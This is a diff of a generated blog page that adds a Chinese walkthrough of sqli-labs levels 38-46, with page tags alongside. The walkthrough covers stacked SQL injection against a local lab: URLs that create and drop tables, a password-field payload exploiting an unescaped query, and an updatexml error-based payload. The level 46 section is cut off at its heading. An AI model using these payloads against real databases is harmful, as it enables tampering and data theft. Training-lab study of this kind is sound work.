@@ -429,9 +429,17 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/sqli-labs/">
+                                <span class="chip bg-color">sqli-labs</span>
+                            </a>
+                        
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">SQL注入</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -457,7 +465,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    52
+                    456
                 </div>
                 
 
@@ -474,7 +482,26 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <script>
+                <h2 id="一-less38"><a href="#一-less38" class="headerlink" title="一.less38"></a>一.less38</h2><p><strong><em>堆叠注入:就是利用利用分号来分隔一个sql语句,然后在同一行再写一个sql语句实现多句并用</em></strong></p>
+<p><strong><em>less38-xx是关于堆叠注入的学习,通关要求是找到注入点进行堆叠注入</em></strong> </p>
+<pre><code>#利用创建表
+http://127.0.0.1/sqli-labs/Less-38/?id=1';create table crow2 like users;--+
+
+#删除创建的表
+http://127.0.0.1/sqli-labs/Less-38/?id=1';drop table crow2;--+
+
+#往users表中插入一组数据(100,Eric,L123);--+</code></pre><p>这里我就不上图了,很容易验证</p>
+<h2 id="2-less39"><a href="#2-less39" class="headerlink" title="2.less39"></a>2.less39</h2><p>本关是id是数字型注入,其他的同less38</p>
+<h2 id="3-less40"><a href="#3-less40" class="headerlink" title="3.less40"></a>3.less40</h2><p>本关是id是单引号+单括号,其他的同less38</p>
+<h2 id="4-less41"><a href="#4-less41" class="headerlink" title="4.less41"></a>4.less41</h2><p>本关同less39,只是没有报错信息而已</p>
+<h2 id="5-less42"><a href="#5-less42" class="headerlink" title="5.less42"></a>5.less42</h2><p>本关是post型的注入,从login中sql语句源码我们可以知道,这里采用的是单引号闭合。由于本关源码中有对username进行mysql_real_escape_string()过滤,而passsword没有,所以可以直接在password进行注入</p>
+<pre><code> $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";</code></pre><p>注入代码:</p>
+<pre><code>账号:随意
+密码:a';create table test like users#</code></pre><p>页面登陆失败,但是表test会被创建(其他操作同理不赘述)</p>
+<h2 id="6-less43"><a href="#6-less43" class="headerlink" title="6.less43"></a>6.less43</h2><p>本关passwood是用单引号+单括号闭合的,其他的同less42</p>
+<h2 id="7-less44"><a href="#7-less44" class="headerlink" title="7.less44"></a>7.less44</h2><p>本关是基于盲注的,除了没有报错信息外其他的同42<br>按照流程来一遍把数据库名,表名,字段名都猜解出来</p>
+<h2 id="8-less45"><a href="#8-less45" class="headerlink" title="8.less45"></a>8.less45</h2><p>45关与43关的payload是一样的，只不过45关依旧没有报错信息(代码直接抄过来用)<br>union select  updatexml(0x3e,concat(1,database(),1),1)#</p>
+<h2 id="9-less46"><a href="#9-less46" class="headerlink" title="9.less46"></a>9.less46</h2><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -554,7 +581,15 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/sqli-labs/">
+                                    <span class="chip bg-color">sqli-labs</span>
+                                </a>
+                            
+                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">SQL注入</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -638,10 +673,10 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return
+                            一.less38堆叠注入:就是利用利用分号来分隔一个sql语句,然后在同一行再写一个sql语句实现多句并用
+less38-xx是关于堆叠注入的学习,通关要求是找到注入点进行堆叠注入 
+#利用创建表
+http://127.0.0.1/sqli
                         
                     </div>
                     <div class="publish-info">
@@ -657,6 +692,18 @@
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/sqli-labs/">
+                        <span class="chip bg-color">sqli-labs</span>
+                    </a>
+                    
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
